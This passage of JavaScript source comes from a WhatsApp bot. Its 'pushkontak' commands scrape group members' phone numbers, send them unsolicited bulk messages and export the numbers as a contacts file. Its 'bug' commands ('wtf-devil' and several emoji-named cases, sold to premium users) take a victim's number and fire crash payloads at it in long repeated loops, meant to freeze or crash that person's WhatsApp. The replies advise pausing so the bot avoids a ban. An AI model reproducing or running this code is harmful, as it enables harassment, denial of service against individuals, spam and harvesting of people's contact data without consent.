contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
if (!text) return reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delaypushkontak * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await anggazyy.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak1": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await anggazyy.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delaypushkontak * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await anggazyy.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak2": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return reply("Format Delay Tidak Valid")
if (!teks) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await anggazyy.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delay * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await anggazyy.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak3": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text.split("|")[0]
var teks = text.split("|")[1]
var groupMetadataa
try {
groupMetadataa = await anggazyy.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
let msgii = generateWAMessageFromContent(mem, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"KLICK INI BUAT SAVE WA KU\",\"url\":\"https://wa.me//6289601071334\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qloc2}) 
await anggazyy.relayMessage(mem,msgii.message, { 
messageId: msgii.key.id 
})
await sleep(8500)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "idgc": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
reply(`${m.chat}`)
}
break
// CASE BUG BY ANGGAZYY NO RENAME
case "wtf-devil": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break

case '💩': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '👽': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🐕': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🐶': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🗿': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
